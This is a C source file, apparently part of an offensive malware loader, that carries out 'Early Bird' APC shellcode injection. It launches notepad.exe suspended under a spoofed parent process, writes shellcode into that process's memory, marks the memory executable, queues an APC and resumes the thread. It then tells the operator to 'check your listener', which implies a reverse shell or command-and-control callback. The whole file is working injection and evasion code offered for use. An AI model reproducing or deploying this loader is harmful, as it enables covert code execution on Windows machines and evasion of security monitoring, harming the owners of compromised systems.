#include "..\helper.h"
#include "ExecuteShellcode.h"

void CreateEarlyBird(char *lpPath, PHANDLE hProcess, PHANDLE hThread, PDWORD dwProcessId) {
    STARTUPINFOA Si = {0};
	PROCESS_INFORMATION Pi = {0};

    memset(&Si, 0, sizeof(STARTUPINFO));
    memset(&Pi, 0, sizeof(PROCESS_INFORMATION));

    LPCWSTR lpwPath = ConvertDataToLPCWSTR(lpPath);

    if (!CreateSpoofedProcess(DEFAULT_SPOOFED_PROC, &Pi, lpwPath)) {
		printf("[-] CreateProcessA Failed  : %d \n", GetLastError());
		return;
	}
    
    *hProcess = Pi.hProcess;
    *hThread = Pi.hThread;
    *dwProcessId = Pi.dwProcessId;
}

VOID ExecShellcode(PBYTE shellcode) {
    char lpPath[] = "C:\\windows\\System32\\notepad.exe";
    int base_size = 1024;
    HANDLE hHeap = GetProcessHeap();
    
    int shellcode_sz = base_size;
    while (shellcode_sz > 0 && shellcode[shellcode_sz - 1] == 0x00) {
        shellcode_sz--;
    }
    
    HANDLE hProcess = NULL, hThread = NULL;
    DWORD dwProcessId = 0;

    printf("\n[+] Starting EarlyBird with PPID/Arg Spoofing...\n");
    CreateEarlyBird(lpPath, &hProcess, &hThread, &dwProcessId);
    
    if (!hProcess || !hThread) {
        printf("[!] Failed to create process.\n");
        return;
    }

    LPVOID memPoolPtr = WrapperVirtualAllocEx(hProcess, NULL, shellcode_sz, (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);
    if (!memPoolPtr) {
        printf("[!] VirtualAllocEx Failed : %u\n", GetLastError());
        return;
    }
    printf("[+] Mem page allocated at: 0x%p\n", memPoolPtr);

    if (!WriteToTargetProcess(hProcess, memPoolPtr, shellcode, shellcode_sz)) {
        printf("[!] WriteProcessMemory failed\n");
        return;
    }
    printf("[+] Shellcode written (%d Bytes)\n", shellcode_sz);

    DWORD oldProt = 0;
    WrapperVirtualProtectEx(hProcess, memPoolPtr, shellcode_sz, PAGE_EXECUTE_READ, &oldProt);

    // Queue APC
    if (!WrapperQueueUserAPC((PAPCFUNC)memPoolPtr, hThread, 0)) {
        printf("[!] QueueUserAPC failed : %u\n", GetLastError());
    } else {
        printf("[+] APC Queued successfully.\n");
    }

    ResumeThread(hThread);
    printf("[+] Thread resumed. Check your listener!\n");


    WaitForSingleObject(hThread, 5000); 

    CloseHandle(hThread);
    CloseHandle(hProcess);
}